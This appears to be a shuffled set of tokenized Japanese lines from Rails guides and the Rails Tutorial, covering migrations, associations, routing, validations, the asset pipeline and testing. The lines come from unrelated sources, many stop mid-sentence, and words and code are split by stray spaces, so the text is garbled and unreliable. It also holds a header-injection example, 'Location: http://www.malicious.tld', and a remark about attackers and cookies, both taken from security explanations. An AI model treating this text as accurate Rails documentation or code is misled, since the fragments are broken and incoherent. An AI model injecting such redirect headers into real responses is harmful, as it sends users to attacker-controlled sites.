{ 0 } 図 12 ▖ 22 : { / 0 }   { 1 } id   1 の ユーザー が id   2 、 7 、 8 、 10 を フォロー し て い る とき の フィード { / 1 }
\ href {https://en ▖wikipedia ▖org/wiki / Public - key_ cryptography}{\emph { 公開 鍵 } } を クリップ ボード に コピー し ま す 。
  $ rails  console  test
ここ で 、 改良 し た 新し い プロフィール 画面 を ブラウザ で 見 て み ま しょ う   ( 図 \ ref { fig :user_profile_no_microposts} )   を ブラウザ で 見 て み ま しょ う
Sass で は 、 冗長 な コード を 削除 し 、 より 自由 な 表現 を 可能 に する ため に 、 \emph { 変数 } が 定義 でき る よう に な っ て い ま す 。
##### `: source_type `
\ kode {edit } アクション と \ kode {update } アクション で 正し い ユーザー を 要求 する こと を テスト する 。
`obj▖to_json ` と ` JSON ▖ parse ( str ) ` を 使用 し て MultiJSON から 乗り換え る 。
確か に パラメータ は 表示 さ れ る よう に な り ま し た が 、 何 の 加工 も さ れ て い ま せ ん 。
Created http://stormy - cloud - 58 8 1 ▖ herokuapp▖ com/ |
マイグレーション を 実行 する と \ kode { admin } カラム が \ kode { users } テーブル   ( リスト \ ref{ code : admin _migration } )   に 追加 さ れ ま す 。
client  =  Client ▖find ( [ 1 ,   10 ] )  #  Client ▖find ( 1 ,   10 ) で も よ い
デフォルト の \ kode { has_many  through } 関連 付け で は 、 Rails は 単一 バージョン の 関連 付け に 対応 する 外部 キー を 探 し ま す ▟ つまり 以下 の コード は
    has_many  : orders  do
Active   Support で は これ ら の メソッド を 拡張 し て 、 他 の 範囲 指定 を 引数 で 指定 でき る よう に し て い ま す 。
####   任意 の ファイル を 使用 し て 出力 する
この コード は リスト \ ref{ code : header_ partial } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
nick ▖ persisted ?
Rails は この 場合 、 \ kode {:uniqueness } を \ kode {true } と 判断 し ま す 。
*  `autoplay :  true ` は ページ 読み込 み 時 に 音声 ファイル を 再生 し ま す 。
    has_many  : customers ,   dependent :  : destroy
この リスク の 詳細 に つ い て は 、 [ セキュリティ ガイド ] ( security▖html # クロス サイト スクリプティング - xss ) の クロス サイト スクリプティング の 節 を 参照 し て くださ い 。
従来 は 、 CSS と Java Script を 整理 する ため に 、 機能 を 個別 の ファイル に 分割 し 、 ( インデント を 多用 し て )   読 み やす い フォーマット に 整え て い ま し た 。
ユーザー を データベース から 見つけ て 検証 する
now   -   1 ▖ week
\ kode { home } アクション に マイクロ ポスト の インスタンス 変数 を 追加 する
以下 は 、 名前 を 出力 する ため の ループ で す 。
<% =  ren der   partial :   " product "  %>
Riley  Moses に よ る ご 指摘 に 感謝 いた し ま す 。
( 上 の コマンド 操作 で は 、 \ ref{ sec : planning_ the_application } の Heroku アプリ を 作成 済み で あ る こと が 前提 で す 。
テスト スイート を きちんと 整備 し て お く こと が いかに 重要 で あ る か 、 皆 さん に も ご 理解 いただけ る と 思 い ま す 。
この 点 を 強化 する ため に 、 検索 機能 を 実装 し て くださ い 。
{ 0 } 図 3 ▖ 1 { / 0 }   { 1 } サンプル アプリケーション の \ kode {config } ディレクトリ の 内容 { / 1 }
` Marshal ` の 拡張
###   パス と URL 用 ヘルパー
上 の ` create_association ` と 同じ で す が 、 レコード が invalid の 場合 に ` ActiveRecord : : Record Invalid ` が raise さ れ る 点 が 異な り ま す 。
###   名前 付き ルーティング ヘルパー に プレフィックス を 追加 する
### `unscope `
この gem で は 、 ページ の レンダリング を 多く の ページ で 高速 化 する の に Ajax を 使用 し て い ま す 。
\ kode { SecureRandom ▖urlsafe_base 64 } は 決して 空欄 に は \emph { なら な く な っ た } の で 、 User モデル の テスト は パス する はず で す 。
##### ` collection ▖ destroy (object ,  ▖▖▖)
パスワード の 不 一致 テスト は この すぐ 後 に 追加 する の で 、 上 の コード で は パスワード と パスワード の 確認 を 両方 とも 空欄 に する こと で パスワード の \emph { 存在 } 確認 テスト を 行な っ て い ま す 。
これ に よ り 、 Active   Model   Serializers と Active   Record オブジェクト の デフォルト の 動作 が 同じ に な り ま し た 。
Active   Job を 使用 する こと で 、 特定 の キュー に 入 っ て い る ジョブ を スケジューリング する こと が でき ま す 。
この よう な でたらめ の サブ ドメイン 名 なら 、 URL を 教え な い 限り サイト に アクセス さ れ る 心配 も あ り ま せ ん 。
*  `config▖ action_controller ▖ action _on_unpermitted_parameters ` は 、 明示 的 に 許可 さ れ て い な い パラメータ が 見つか っ た 場合 に ログ 出力 また は 例外 発生 を 行な う か どう か を 指定 し ま す 。
変更 の 結果 、 Home ページ は 図 \ ref { fig : home_ page _ follow_ stats } の よう に な り ま す 。
詳細 に つ い て は ドキュメント を 参照 し て くださ い 。
{ 0 } 図 2 ▖ 4   { / 0 } { 1 } Users リソース   ( \ href { http://local host : 3000 / users }{/ users } )   ページ の 最初 の 状態 { / 1 }
これ で 少し 見え て き ま し た ▟ 今 から 書 く アプリケーション コード で も これ と 同じ 方法 を 使用 する こと に し ま しょ う 。
作成 し た アプリケーション を Heroku の 本番 環境 に デプロイ し た 。
この 時点 で 、 サンプル アプリケーション は Web サイト と し て の 十分 な 基盤   ( ユーザー を 認証 し たり 認可 し たり )   が 整 っ た と いえ る で しょ う 。
テンプレート 内 に flash の メッセージ が 差し込 ま れ る の で 、 次 の よう な コード は 、
resources   : photos ,   except: : destroy
     create_table   :employees  do  | t |
   class  C
この 問題 は \ ref{ sec :a_flash_test } で 修正 し ま す 。
ERb に よ っ て 実際 に 生成 さ れ る HTML は それ ほど 重要 で は あ り ま せ ん が 、 興味 が あ る 方 の ため に 、 以下 の 核心 部分 を お 見せ し ま す 。
共通 の バリデーション オプション
この すべて を 実装 し た 結果 を 、 リスト \ ref{ code :relationships_controller } に 示 し ま す 。
< h 1 > Books  are   coming   soon !
  # ▖▖▖
以下 は 、 その 中 の ごく わずか に 過ぎ ま せ ん 。
今度 は データベース を 覗 い て 、 新規 ユーザー が 確か に 登録 さ れ て い る こと を ダブル チェック し ま しょ う 。
`helpers_ path ` パラメータ を 明示 的 に 使用 し て い る 場合 を 除 い て 、 この 変更 は エンジン から ヘルパー を 読み込 む 方法 に しか 影響 し ま せ ん 。
この コード は リスト \ ref{ code :initial _failing _ signin_test } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
上 の コメント は 、 \ kode {before }   ブロック の コード が 慣用 的 な 意味 で 正し く な い こと を 指摘 し て い ま す 。
段階 ごと に テスト を 作成 し て RSpec を 実行 する こと で 、 テスト 駆動 開発 に よ っ て アプリケーション 開発 を 進め る 方法 を 理解 でき る よう に な る で しょ う 。
まったく 同じ こと を マイクロ ポスト で 行 い ま す 。
Rails の ルーター は 受け取 っ た URL を 認識 し 、 適切 な コントローラ 内 アクション に 割り当て ま す 。
参考 資料
レイアウト に footer パーシャル を 追加 する
サイト ロゴ に CSS を 追加 する
|   GET        | / kategorien                 |  categories#index    |  categories_ path         |
#   今年 を デフォルト 値 に 持 ち 、 1900 年 から 2009 年 まで を オプション に 持 つ セレクト ボックス を 生成 する
` new ` メソッド を 実行 する と 単に 新し い オブジェクト が 返 さ れ ま す が 、 ` create ` を 実行 する と 新し い オブジェクト が 返 さ れ 、 さらに データベース に 保存 さ れ ま す 。
      t ▖ references  : publication_type
この コード で は 、 昨日 作成 さ れ た 注文   (order )   を 持 つ すべて の クライアント を 検索 し ま す ▟ ここ で も SQL の ` BETWEEN ` 式 を 使用 し て い ま す 。
ファイル が 表示 さ れ る よう に する に は 、 ファイル ナビゲーター の 歯車 アイコン を クリック し て   [ Refresh  File   Tree ]   を クリック し ま す ▟ )
状況 に よ っ て は 動的 コンパイル   ( live  compilation )   を 使用 し た い こと も あ る で しょ う 。
before_ save   : set_author
この 時点 で 、 ( 送信 ボタン を 押 し て も エラー が 出 な い と い う 意味 で )   ユーザー 登録 フォーム は 動 く よう に な り ま す 。
バージョン 管理 を 使用 し て い る 場合 は 、 いつ も と 同じ よう に トピック ブランチ を 作成 し ま す 。
  http_ basic _authenticate_with   name :  " dhh" ,   password :  " secret " ,  only:  : destroy
< li >`: password ` -  メール サーバー で 認証 が 必要 な 場合 は ここ で パスワード を 指定 する ▟</ li >
デバッグ モード を オフ に する と 、 上 の マニフェスト ファイル に よ っ て 以下 が 生成 さ れ る よう に な り ま す 。
####  Rails   全体 の テスト を 実行 する
\ kode { current\ _user } の 「 記憶 」 ブランチ を テスト でき た の で 、 今後 は 手動 で ひと つ ひと つ 確認 し な く て も 、 自信 を 持 っ て 回帰 バグ を キャッチ でき ま す 。
リスト \ ref{ code : example _user } で は 、 以下 の よう に Ruby の \ kode {attr\_accessor } メソッド を 使用 し ま し た 。
したが っ て 、 今回 は 手動 で \ kode { picture\ _ size } と い う 独自 の バリデーション を 定義 し ま す ▟ 結果 は リスト \ ref{ code :micropost _model_ image_validation } の とおり で す 。
`: constraints ` で は 正規 表現 を 使用 でき ま す が 、 ここ で は 正規 表現 の 「 アンカー 」 は 使用 でき な い と い う 制限 が あ る こと に ご 注意 くださ い 。
Rails アプリケーション と エンジン の 開発 者 は 、 これ ら の アセット を 手動 で ` app/assets ` に 置 き 、 ` config ▖ assets▖precompile ` を 設定 し て くださ い 。
アセット パイプライン を 有効 に し て い る 場合 は 以下 の 設定 を 追加 し ま す 。
テスト に パス する こと も 確認 し て お き ま しょ う 。
  <%= yield  : head   %>
\ ref{ sec : showing _ users } で は もっと 本格 的 な ユーザー 一覧 ページ を 作成 する 予定 で す 。
適切 な ` config/ environments/$ RAILS _ ENV ▖ rb ` ファイル に 追加 する 設定 の 例 を 以下 に 示 し ま す 。
beginning _ of_quarter   ( at_beginning _ of_quarter )
これ は 、 以下 の よう に イニシャライザ ファイル ` config/initializers/sandbox _email _ interceptor ▖ rb ` で 行 い ま す 。
/*  mixins ,   variables ,  etc▖ */
今回 の Toy アプリケーション で は 、 ユーザー と 短 い マイクロ ポスト のみ を サポート する マイクロ ブログ を 作成 し ま す 。
ターミナル ウィンドウ で Spork を 起動 する 。
Gemfile を 更新 し た ら 、 いつ も の よう に ` bun dle  install ` を 実行 する の を 忘れ ず に 。
password_digest :   " $ 2 a $ 10 $ kn 4cQDJTzV76 ZgDxOWk 6 Je 9 A0Ttn ▖▖▖ "
マイグレーション が 完了 すれ ば 、 Toy アプリ を 実際 の Postgre SQL データベース を バック エンド に 配置 し た 本番 環境 で 利用 でき る よう に な っ て い る はず で す ( 図 \ ref { fig:toy_ app _production } ) 。
#####  レイアウト の 継承
Location :   http://www ▖malicious ▖tld
     This   is   the   home   page   for   the
しかし 、 ここ で 不思議 な 点 が いく つ も あ り ま す 。
   git  commit :  % Q {  - m  ' Initial  commit '  }
    < meta  content = ' text /html;  charset = UTF - 8 '   http-equiv = ' Content- Type' />
Using   the   generalized  \kode {authenticated ? } 
コメント の 削除 も 認証 済み ユーザー に だけ 許可 し た い の で 、 ` Comments Controller`  ( `app/controllers/ comments_controller▖ rb ` )   に 以下 の よう に 追記 し ま しょ う 。
この テスト に は 、 管理 者 自身 を 削除 する ため の リンク が 管理 者 に 表示 さ れ て い な い こと を 確認 する テスト も 含 ま れ て い る こと に 注意 し て くださ い 。
Rails の Java Script は 、 「 控えめ な Java Script 」 原則 に 基 い て 、 Java Script に よ る 要素 と Ruby に よ る 要素 の 2 つ の 要素 で 構成 さ れ て い ま す 。
デフォルト の 出力 結果 は 、 CoC の よ い 例 で も あ り ま す 。
*   X - Runtime ヘッダー を 生成 し ま す ▟ この ヘッダー に は リクエスト の 処理 に かか っ た 時間 が 秒 単位 で 表示 さ れ ま す 。
development モード で は false 、 production モード で は true に 設定 し ま す 。
さらに モデル の テーブル も 名前 空間 化 さ れ 、 単なる ` articles ` で は な く ` blorgh_ articles ` に な り ま す 。
その ため に まず 、 好み の エディタ で \ kode { Gemfile } を 開 き ま す 。
    #  何 か 書 く
もちろん 読者 の 皆 様 は 、 目的 に 応 じ て どちら の サービス を 選 ん で も かま い ま せ ん 。
統合 テスト と ビュー が 更新 さ れ た ら 自動 的 に 適切 な テスト が 実行 さ れ る よう に 、 生成 さ れ た \ kode { Guardfile } を 編集 し ま す   ( リスト \ ref{ code : guardfile } ) 。
" Oh   dear !   Oh  dear !  
@ open _orders = @customer▖ orders▖find ( 1 )
= >   [ 17 ,   42 ,   8 ]
( コントローラ 名 に は 複数 形 を 使 い 、 モデル 名 に は 単数 形 を 用い る と い う 慣習 を 頭 に 入れ て お い て くださ い ▟ コントローラ は Users で モデル は User で す ) 。
*  ` after_enqueue `
先 に 紹介 し た `ordinal ` メソッド は 、 序数 文字 列   * * だけ * *   を 返 す 点 が 異な る こと に ご 注意 くださ い 。
1 )   # => true
   before_ save   {  return false  } #  良 く な い
resources   : photos ,   as :  'images'
     original _ process ( action ,   params ,  session ,   flash ,  http_method )
これ ら の 機能 ごと に 新し い リソース を 作成 し 、 それぞれ の コントローラ / ルーティング / データベース 移行 の 例 に つ い て 見 て い く こと に し ま す 。
モックアップ に 基 い て 作成 し た 最終 結果 は 図 \ ref { fig : site_with _ footer } で 確認 する こと が でき ま す 。
\ kode {index } アクション が 実行 さ れ 、 そこ から User モデル に 、 「 すべて の ユーザー を 取り出せ 」 ( \kode {User ▖ all } ) と 問い合わせ る 。
Ruby の キー ワード で な い 、 英語 と し て の " true " と " false " に は regular フォント   ( Italic や Bold で な い フォント )   を 使用 する こと 。
ここ で 以下 の ルール に 注目 し て み ま しょ う 。
この モジュール は 、 画像 ・ Java Script ファイル ・ スタイル シート ・ フィード など の アセット に ビュー を リンク する HTML を 生成 する メソッド を 提供 し ま す 。
Rails アプリケーション の バージョン が 3 ▖ 0 より 前 の 場合 、 まず 3 ▖ 0 へ の アップグレード を 完了 し て から Rails   3 ▖ 1 へ の アップグレード に とりかか っ て くださ い 。
select を 使用 する と 、 選択 し た フィールド だけ を 使用 し て モデル オブジェクト が 初期 化 さ れ る ため 、 注意 し て くださ い 。
person   =   Person ▖ create ( name :  " !
Active   Model
item▖ with _lock   do
ライブラリ や Gem を プリ プロセッサ 化 する
この セクション で は 冒頭 で ` count ` メソッド を 例 に 取 っ て 説明 し て い ま す が 、 ここ で 説明 さ れ て い る オプション は 以下 の すべて の サブ セクション に も 該当 し ま す 。
concern を 使用 する こと で 、 他 の リソース や ルーティング 内 で 使いまわせ る 共通 の ルーティング を 宣言 する こと が でき ま す 。
   " X " ▖ constantize   # => : in_Object   ( ! )
リスト \ ref{ code : layout_with _ partials } で は 、 以下 の よう に \ kode {ren der } と 呼 ば れ る Rails ヘルパー 呼び出し だけ を 使 っ て 、 HTML   shim の スタイル シート 行 を 置換 し て い ま す 。
上 の メソッド で 使用 さ れ て い る 項目 に つ い て 簡単 に 説明 し ま す 。
以下 の SQL スニペット と 置き換え る こと が でき ま す 。
      t ▖ belongs_to  : part
インスタンス レベル の ` respond_to ` は 今回 の アップグレード の 影響 を 受け ま せ ん の で 、 gem を 追加 する 必要 は あ り ま せ ん 。
{ 0 } 表 7 ▖ 1 { / 0 }   { 1 } リスト \ ref{ code :rails_ routes } の Users リソース が 提供 する RESTful な ルート { / 1 }
####  シンプル な ビュー で パーシャル を 使用 する
#   マイクロ ポスト が データベース から な く な っ た こと を 確認
     Rails   2 ▖ x の デフォルト の クエリ 文字 列 は ファイル の 更新 日付 に 基 い て い ま し た 。
  unless  token▖blank ?
   def  article _params
この メソッド の 背後 に は 強力 な \emph { インフレクター   ( 活用 形 生成 )   }  が あ り 、 不 規則 活用 を 含 む さまざま な 単語 を 複数 形 に する こと が でき ま す 。
この メソッド に は 略記法 も あ り ま す 。
なお 、 \ kode { created_at } カラム は 、 \ ref{ sec : ordering_ and_dependency } や \ ref{ sec : ren dering _microposts } の 実装 を 進め て い く 上 で 必要 な カラム で す 。
TIP:   これ ら の ミドルウェア は いずれ も 、 Rack の ミドルウェアスタック に 利用 でき ま す 。
config ▖ assets▖ configure  do  |env |
* `preload `
belongs_to  : author ,   class_ name : Blorgh ▖ author_ class
デフォルト は ` false ` で あ り 、 この 場合 関連 付け られ た オブジェクト は 保存 時 に 検証 さ れ ま せ ん 。
さらに Rails は 、 無効 な 内容 で 送信 が さ れ て 元 の ページ に 戻 さ れ る と 、 \ kode {div } で 囲 ま れ た エラー 用 の CSS クラス \ kode {field\_with \_errors } を 返 し ま す 。
Client ▖ order ( " orders_count   ASC " ,   " created_at   DESC " )
{ 0 } 図 9 ▖ 7 { / 0 }   { 1 } 保護 さ れ た ページ に アクセス し た 直後 の ログ インフォーム { / 1 }
この コード は リスト \ ref{ code : account_activation_view_ text } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
*   Ruby   on   Rails の コード に 貢献 する 方法
プリ プロセッサ エンジン
` before_ add ` コール バック が 例外 を 発生 し た 場合 、 オブジェクト は コレクション に 追加 さ れ ま せ ん 。
   def  notify ( user ,  ▖▖▖)
この To   get  this   to   work ,  we  need to   define   the  \ kode { password _ reset_expired ? }
そこ で 今度 は ` Articles Controller ` コントローラ 内 に ` create ` アクション を 作成 し 、 フォーム が 動作 する よう に し ま しょ う 。
Mac   OS   X を 含 む 多く の Unix 系 OS で は プロンプト と し て ドル 記号 ` $ ` が 使用 さ れ ま す 。
person   =   Person ▖ new
\ ref{ sec :a_user_ class } の User クラス と 同様 に 、 User モデル の インスタンス は ドット 記法 を 用い て その 属性 に アクセス する こと が でき ま す 。
以下 の メソッド は すべて 再 実装 さ れ る ため 、 これ ら を 使用 する ため に ` active_ support/core _ext/ date/ calculations ▖rb ` を 読み込 む 必要 は   * * あ り ま せ ん * * 。
バリデーション エラー に 対応 する
*  ` after _perform `
Web アプリケーション は 突き詰め れ ば ただ の 文字 列 に 過ぎ ま せ ん が 、 実際 に は これ ら の 文字 列 を \emph { 作 る } ため に 文字 列 以外 の データ 構造 も 必要 と な り ま す 。
削除 リンク が 、 現在 の ユーザー に よ っ て 作成 さ れ て い な い マイクロ ポスト に は 表示 さ れ な い こと を 確認 する ため の テスト を 作成 し て くださ い 。
Rails   で   Java Script   を 使用 する
` parent_ name ` メソッド は 、 名前 が ネスト し た モジュール に 対 し て 実行 でき 、 対応 する 定数 を 持 つ モジュール を 返 し ま す 。
###  ヘッダー インジェクション
now ▖ change ( year :   2011 ,  offset :   Rational ( - 6 ,   24 ) )
╼╼    %  subsection  a_working _ form   ( end ) ╼╼    \ subsection { Strong   Parameters} %  ( fold) ╼    \ label{ sec : strong _ parameters}╼╼
About ページ の コード
ローカル PC 上 の ローカル リポジトリ に 新し い リモート を 追加 し ま す 。
        route     get   " static _ pages/help "
*  ` Rack : : Sendfile ` は 、 body が 1 つ の ファイル から 作成 さ れ て い る レスポンス を キャッチ し 、 サーバー 固有 の X - Sendfile ヘッダー に 差し替え て から 送信 し ま す 。
これ ら の 属性 は インスタンス の レベル で アクセス また は オーバーライド でき ま す 。
最初 の 状態 に 戻 し た い 場合 は 、 以下 の コマンド を 使 い ま す 。
今度 は イベント を 活用 し て 改良 し て み ま しょ う 。
   validates  : legacy _ code ,   format: {  with : /\A [ a - zA- Z ] + \ z / ,
#   root   'welcome#index'
  <title> A  simple  page </title >
無効 な 情報 を ユーザー 登録 フォーム で 送信 し た 結果
` has _one ` 関連 付け に オブジェクト を アサイン し 、 しかも その オブジェクト を 保存 し た く な い 場合 、 ` association▖build ` メソッド を 使用 し て くださ い 。
*  `config▖ active_ record ▖ schema_migrations_table_name ` は 、 スキーマ マ イグレーション テーブル の 名前 と し て 使用 する 文字 列 を 指定 し ま す 。
CSS ルール で は 一般 に 、 クラス 、 id 、 HTML タグ 、 また は それ ら の 組み合わせ 、 の いずれ か を 指定 し ま す ▟ そして その 後ろ に スタイリング コマンド の リスト を 記述 し ま す 。
Set - Cookie : _blog_session =▖▖▖snip▖▖▖;  path=/; HttpOnly
*   Rails   4 ▖ 0 で は unicode 文字 の ルーティング の 描出 方法 が 変更 さ れ ま し た 。
この ルーティング ヘルパー で は id を 指定 する 必要 が な い 点 に ご 注目 くださ い 。
###  高度 な 制限
Microposts コントローラ 自体 の 構造 を { 0 } { 1 } リスト 2 ▖ 9 { / 1 } { / 0 } に 示 し ま す 。
###  条件 付き バリデーション を グループ 化 する
マイクロ ポスト が 表示 さ れ た プロフィール ページ の モックアップ
リスト \ ref{ code : basic _ signup_tests } の とき
d ▖ advance ( years :   1 ,  months :   1 ,   days :   1 ,   hours:   1 ,  minutes :   1 ,  seconds :   1 )
< li > `:sendmail ` -- `config▖ action _mailer▖sendmail_settings ` で 設定 可能 ▟</ li >
` Articles Controller ` コントローラ に ` new ` メソッド を 作成 し て から ブラウザ で < http://local host : 3000/articles/new > を 再 表示 する と 、 今度 は また 違 う エラー が 表示 さ れ ま す 。
  <%=  f ▖ label  : author_ name  %><br>
[ ] ▖ sum    # = >  0
* `test _framework ` は 、 使用 する テスト フレームワーク を 指定 し ま す 。
コード を 実際 に 書 く 前 に 、 パスワード 再 設定 の 想定 手順 を モックアップ   ( = スクリーン ショット 画像 を 改変 し て 作 っ た 模型 )   で 確かめ ま しょ う 。
|   GET        | / comments/: id ( ▖: format )                 |  comments # show      | sekret_comment_ path      |
著者 の 場合 、 以下 を インストール する 必要 が あ り ま し た   ( ここ で は \ href { http://mxcl ▖ github▖ com/homebrew/}{ Homebrew } と い う Mac   OS   X 用 の パッケージ 管理 システム を 使用 し て い ま す ) 。
`nil ` を 指定 する と ログ 出力 を 行 わ な く な り ま す 。
# =>  Mon ,   09   Aug  2010   23 : 20 : 0 5   UTC   + 0 0 : 0 0
Article▖ none   #   空 の リレーション を 返 し 、 クエリ を 生成 し な い 。
この よう な とき は 、 「 generate 」 と い う 言葉 に 因 ん で 、 \ texttt { rails   destroy } と い う コマンド を 実行 する こと で 元 に 戻 す こと が でき ま す 。
これ に よ り 多く の 利点 が 得 られ ま す 。
また 、 Ruby   に は 特有 の クセ が あ る の で 、 これ も 本書 で 初めて 触れ る 知識 に な る で しょ う 。
` extract ! ` メソッド は 、 与え られ た キー に マッチ する キー / 値 ペア を 取り除 き 、 取り除 い た ペア を 返 し ま す 。
###  テンプレート
以下 を 実行 し て 変更 を コミット でき ま す 。
アプリケーション は 、 ページ ごと に 以下 の 呼び出し を 行 い ま す 。
<%  if   pages ▖many ?  
NOTE :   実際 の レンダリング は 、 ` ActionView:: TemplateHandlers ` の サブ クラス で 行 わ れ ま す 。
` config▖ active_ support▖ deprecation ` に 値 が 設定 さ れ て い な い 場合 、 この イニシャライザ は 、 現在 の 環境 に 対応 する ` config/ environments ` ファイル に 値 を 設定 する よう 促 す メッセージ を 出力 し ま す 。
この コード は リスト \ ref{ code :user_ pages_spec } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
アプリケーション で アセット パイプライン を 使用 せ ず に jQuery   Java Script ライブラリ を インク ルード する 場合 は 、 ソース と し て ` : defaults ` を 渡 し て くださ い 。
ユーザー の 有効 化 が 役 に 立 つ ため に は 、 ユーザー が 有効 で あ る 場合 に のみ ログ イン でき る よう に ログ イン 方法 を 変更 する 必要 が あ り ま す 。
# =>  ActiveRecord : : Record Invalid :   Validation  failed :   空欄 に は でき ま せ ん
この 場合 、 ホスト アプリケーション で は ` admin ▖css ` や ` admin ▖ js ` は 不要 で す 。
###  FormOptionsHelper
# =>  [ " 私 は David " ,   " 私 は Jeremy " ,   " 私 は Jose " ]
ユーザー 登録 機能 の 実装 は 、 私 たち の サンプル アプリケーション に と っ て 大きな マイルストーン で し た 。
  ( end ) ╼╼    \ subsection { ユーザー の 作成 と 認証 }  %  ( fold) ╼    \ label{ sec : creating_ and _authenticating _a_user} ╼╼
Oh ▖▖▖ "
<% =  raw  @ cms▖ current_template  %> <%# @ cms▖ current_template を その まま 挿入   % >
`select ` タグ と 、 ` object ` が 属 する クラス の メソッド 値 の 既存 の 戻 り 値 を コレクション に し た ` option ` タグ を 返 し ま す 。
Rails アプリケーション が 以下 の HTTP リクエスト を 受け取 っ た と し ま す 。
   alias _ method  : process ,  : process _with _stringified_params
##### ` beginning _ of_month` 、 `end _of_month `
next _ month
アプリケーション の { 0 } Gemfile { / 0 } の 内容 を リスト { p 1 } で 置き換え た ら 、 { 0 } bun dle  install { / 0 } を 実行 し て gem を インストール し ま す
ブロック を 渡 さ な い 場合 、 引数 と し て 受け取 っ た 値 が セパレータ と し て 使用 さ れ ま す ▟ デフォルト の セパレータ は ` nil ` で す 。
</pre >
### ` exclude ?
Client ▖ w here ( " orders_count  >   10 " ) ▖ reverse_order
# =>  Thu ,   0 5   Aug  2010   11 : 33 : 31   + 0000
{ a :   1 ,  b :   2 } ▖ except(:a)  # => {: b = > 2 }
*  ` routes▖rb ` の コード の 読 み 方
   transform _keys { |key|  key▖ to_sym  rescue  key  }
    Last   name  : <%=   person _form ▖ text _field  : last_ name  %>
Cloud 9 で インデント を スペース 2 つ に 設定 する 。
#### `ren der ` で `: inline ` オプション を 使用 する
また 、 Sprockets は ` Cache - Control `  HTTP ヘッダー を ` max - age = 315 3600 0 ` に 変更 し ま す 。
テンプレート ビュー は 、 通常 の ビュー と 同様 ERB で 自由 に カスタマイズ でき ま す ▟ ここ で は 挨拶 文 に ユーザー 名 を 含め 、 カスタム の 有効 化 リンク を 追加 し ま す 。
` first ` メソッド は 、 主 キー 順 の 最初 の レコード を 取り出 し ま す 。
続 い て ` app/views/articles/show ▖html ▖erb ` の 内容 を 以下 の よう に 変更 し ま しょ う 。
# < contributors>
特定 の 属性 のみ を 更新 する 必要 が あ る 場合 は 、 以下 の よう に \ kode {update_attribute } を 単発 で 使用 し て 制限 を 回避 する 必要 が あ り ま す 。
慣習 的 に 正し く マイクロ ポスト を 作成 する  
読み込 ま れ た ミドルウェア の 役割 は 下表 の とおり で す 。
この 他 に バインド 可能 な イベント など の 詳細 に つ い て は 、 [ Turbolinks  README ] (https://github▖ com/rails/turbolinks/blob /master / README ▖ md ) を 参照 し て くださ い 。
文字 列 を 引数 に 取 る メソッド を 作 る ため だけ に 、 わざわざ 新し い クラス を 作 る の は 変 で す 。
# =>  Mon  Oct   18   0 0 : 0 0 : 0 0   UTC   15 8 2
Active   Record オブジェクト に 関連 付け られ る コンテナ タグ を 出力 し ま す 。
セッション を 実装 する に は 、 様々 な コントローラ や ビュー で おびただし い 数 の 関数 を 定義 する 必要 が あ り ま す 。
有効 な メール アドレス か どう か   ( ドット が ２ つ 以上 連続 する か どう か )   を 検証 する 正規 表現  
jQuery を 使用 する の で あ れ ば 、 たとえば 以下 の よう な コード を 書 く こと が あ る で しょ う 。
ユーザー が ログ イン 中 の 状態 と は 、 セッション に ユーザー が 存在 する 、 つまり \ kode { current_user } が \ kode {nil } で な い と い う こと で す 。
Rails は 、 追加 さ れ る オブジェクト や 削除 さ れ る オブジェクト を コール バック に ( 引数 と し て ) 渡 し ま す 。
継承 の 関係 を 図 \ ref { fig:static _ pages_controller_ inheritance } に 示 し ま す 。
#   David と い う 名前 を 持 つ 最初 の ユーザー を 返 す
この 作業 に は ある 程度 の リファクタリング が 必要 な の で 、 テスト を 作成 し て バグ の 再発 を キャッチ する よう に し ま す 。
AND   locked = ? " ,   params [ : orders ] ,  false )
     This   is   the   home   page   for   the
   def  change
たとえば 、 図 \ ref { fig: cloud 9 _ gemfile } , を もう 一 度 見 て み る と 、 コード を 80 文字 以下 に 抑え る ため の 小さな 縦線 が 右側 に 見え ま す 。
例外
####  password _field_tag
/photos/ 1 / change
   validates : name , : login ,  :email ,  absence :  true
この 区別 は この 章 に お い て は 重要 で は あ り ま せ ん が 、 \ ref{ sec : rails_environments } で これ ら の 環境 に つ い て 詳細 に 説明 し ま す 。
上 の ` customer ` パーシャル 呼び出し で は 、 ` customer ` ローカル 変数 は 親 の ビュー の `@new_ customer ` 変数 を 指 し ま す 。
*  ` after_ add `
これ は リスト \ ref{ code : respond_to_ password_digest } で 使用 さ れ て い ま し た 。
これ まで と 同様 、 開発 と 同時 に テスト も 作成 し ま す ▟ RSpec と Capybara の 適用 範囲 を 拡大 し 、 簡潔 かつ 表現 力 豊か な 結合 テスト を 作成 し ま す 。
` head ` メソッド を 使用 する こと で 、 ヘッダ だけ で 本文   ( body )   の な い レスポンス を ブラウザ に 送信 でき ま す 。
`ren der ` の `:status ` オプション の 場合 と 同様 、 ` redirect_to ` の `:status ` も ヘッダー を 指定 する 時 に 数値 の 他 に シンボル も 使用 でき ま す 。
ユーザー の \ kode { show } ページ で マイクロ ポスト が 表示 さ れ て い る こと を テスト する 。
file_field(:user ,   : avatar )
>  puts  ENV [ ' DATABASE _ URL ']
resources   : photos,  : books ,  : videos
以下 の ステップ 定義 に よ っ て 扱 わ れ ま す 。
イン ライン コール バック ブロック で ` return ` 文 を 書 く と 、 コール バック 実行 時 に ` Local JumpError ` が 発生 する よう に な り ま し た 。
    root   'welcome#index'
*  ` has _one `
orders▖empty?
実際 の 比較 で は 、 \ kode {= = } の 代わり に \ kode {is\_ password ? } と い う 論理 値 メソッド が 使用 さ れ て い ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
普通 の アプリケーション で あ れ ば 、 記事 や コメント の 作者 を 表 す ため の ` User ` クラス が 備わ っ て い る で しょ う 。
相手 で は な く 自分 の クラス が 外部 キー を 持 っ て い る の で あ れ ば 、 ` belongs_to ` を 使 う べ き で す 。
StaticPages コントローラ の テスト   ( リスト \ ref{ code :title_tests} )   に も 重複 が あ る こと に お 気 付き で しょ う か 。
= >  Abstract Controller : : Base
もちろん 、 攻撃 者 に し て み れ ば 標的 ユーザー が 自分 で 自分 の cookie を 表示 し た ところ で 何 の 意味 も あ り ま せ ん 。
###  テスト ヘルパー の 変更
パス スコープ を 使用 する ルーティング 同士 で の 名前 の 衝突 を 避け た い 場合 に 使用 し て くださ い 。
